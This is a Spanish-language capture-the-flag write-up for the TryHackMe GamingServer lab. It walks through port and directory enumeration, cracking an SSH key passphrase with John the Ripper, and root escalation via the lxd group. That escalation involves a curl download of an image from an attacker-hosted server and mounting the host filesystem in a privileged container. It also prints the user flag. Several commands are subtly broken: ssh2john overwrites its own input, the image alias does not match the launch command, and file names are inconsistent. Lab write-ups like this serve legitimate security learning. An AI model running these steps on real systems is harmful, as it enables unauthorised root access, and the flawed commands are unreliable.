# GamingServer - TryHackMe Writeup

## Reconocimiento Inicial

### Escaneo de Puertos con Nmap

Comenzamos realizando un escaneo de puertos para identificar servicios disponibles:


```bash
nmap -Pn -sV 10.10.159.106
```

**Resultados:**

- **Puerto 22** - SSH
- **Puerto 80** - HTTP

---

## Enumeración Web

### Gobuster - Búsqueda de Directorios

Sin credenciales disponibles, enumeramos el servidor web en el puerto 80:



```bash
gobuster dir -u http://10.10.159.106/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

<img width="484" height="142" alt="image" src="https://github.com/user-attachments/assets/169a5696-063a-4d37-9d04-1a6842821af2" />


### Análisis del Sitio Web

Visitamos el puerto 80 y revisamos el código fuente de la página principal:

<img width="725" height="67" alt="image" src="https://github.com/user-attachments/assets/710ddff3-0406-440d-819f-15826884c486" />


> **Hallazgo:** En el código fuente encontramos un **nombre de usuario**.

---

## Exploración de Directorios Encontrados

### Directorio `/uploads`

Contiene un archivo que parece ser una lista de contraseñas (diccionario).

<img width="391" height="105" alt="image" src="https://github.com/user-attachments/assets/9aa0cefd-6f1b-4b76-b03d-9732b7ae2f92" />


**Acción:** Copiamos el contenido en un archivo local llamado `wordlist`

<img width="243" height="346" alt="image" src="https://github.com/user-attachments/assets/d7bc99d0-25f9-4688-9356-48a367eb03ed" />


### Directorio `/secret`

Encontramos lo que parece ser una **clave SSH cifrada**.

<img width="472" height="444" alt="image" src="https://github.com/user-attachments/assets/4c152ef6-16e7-46c6-9b45-1b1834243339" />


---

## Descifrado de la Clave SSH

### 1. Extraer el hash de la clave SSH

Primero guardamos la clave en un archivo llamado `clave.hash`, luego convertimos la clave a un formato que John the Ripper pueda procesar:

```bash
locate ssh2john
/usr/share/john/ssh2john.py clave.hash > clave.hash
```
### 2. Crackear la contraseña con John

```bash
sudo john --wordlist=wordlist.txt clave.hash
```

<img width="267" height="47" alt="image" src="https://github.com/user-attachments/assets/83baadbc-bfab-4343-88f6-bf9d79a74898" />



### 4. Ajustar permisos de la clave

```bash
chmod 600 id_Rsa
```

### 5. Conectar por SSH

```bash
ssh -i id_rsa john@10.10.159.106
```


---
## User Flag

Una vez dentro, podemos leer la flag de usuario:

```bash
cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```


---

## Escalada de Privilegios

### Identificación del Vector de Escalada

Ejecutamos el comando `id` para verificar los grupos del usuario:

````bash
uid=1000(john) gid=1000(john) groups=1000(john),108(lxd)
````

> **Vector identificado:** El usuario pertenece al grupo `lxd` (ID 108).

### Verificar imágenes LXD

```bash
lxc image list
```

**Resultado:** No hay imágenes disponibles.

---

## Preparación del Ataque LXD

### En la Máquina Atacante (Kali)

#### 1. Descargar Alpine Builder

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```

#### 2. Iniciar servidor HTTP

```bash
python3 -m http.server 8000
```

### En la Máquina Víctima

#### 3. Descargar la imagen Alpine

Nos movemos a un directorio con permisos de escritura (por ejemplo `/tmp`):

```bash
cd /tmp
curl http://10.9.121.2:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz --output alpine.tar.gz
```

---

## Explotación LXD para Root

### 1. Importar la imagen


```bash
lxc image import ./alpine.tar.gz --alias "id"
```

### 2. Verificar la imagen importada


```bash
lxc image list
```

### 3. Crear contenedor privilegiado

```bash
lxc init valerie gaming -c security.privileged=true
```

### 4. Montar el sistema de archivos del host

```bash
lxc config device add gaming mydevice disk source=/ path=/mnt/root recursive=true
```

> **Explicación:** Esto monta el directorio raíz del host (`/`) en `/mnt/root` dentro del contenedor.

### 5. Iniciar el contenedor

```bash
lxc start gaming
```

### 6. Ejecutar shell en el contenedor

```bash
lxc exec gaming /bin/sh
```

### 7. Navegar al sistema de archivos del host


```bash
cd /mnt/root/root
ls
```

---

## Root Flag

```bash
cat root.txt
```

<img width="335" height="21" alt="image" src="https://github.com/user-attachments/assets/4c928ee9-afa6-4f8f-ad27-abb79f3b1c43" />



# APRENDIZAJES

## Escalada de Privilegios con LXD

LXD es un gestor de contenedores en Linux. Si un usuario pertenece al grupo `lxd`, puede crear contenedores privilegiados que comparten el kernel del host. Al montar el sistema de archivos raíz (`/`) del host dentro del contenedor como `/mnt/root`, se obtiene acceso root completo al sistema real.

**Pasos clave:**

1. Crear contenedor con `security.privileged=true`
2. Montar el filesystem del host en el contenedor
3. Ejecutar shell en el contenedor
4. Acceder a `/mnt/root` que es el `/` del host real

**Vector de ataque:** Usuario en grupo `lxd` → Contenedor privilegiado → Root en host

---

## Aprendizaje

Una clave SSH puede estar protegida con una contraseña (passphrase). Cuando esto ocurre, necesitas la contraseña cada vez que usas la clave.

**Proceso de descifrado:**

1. **John the Ripper** encuentra la contraseña que protege la clave (no modifica el archivo)
2. **OpenSSL** usa esa contraseña para crear una nueva clave SIN protección
3. La clave descifrada permite conexiones SSH sin escribir contraseña

**Comando clave:**

````bash
openssl rsa -in clave_cifrada -out clave_limpia
```

'Importante:' Debes usar el archivo NUEVO (descifrado), no el original (cifrado).
```
John → Encuentra contraseña
OpenSSL → Descifra la clave
SSH → Usa la clave descifrada
````

#lxd 
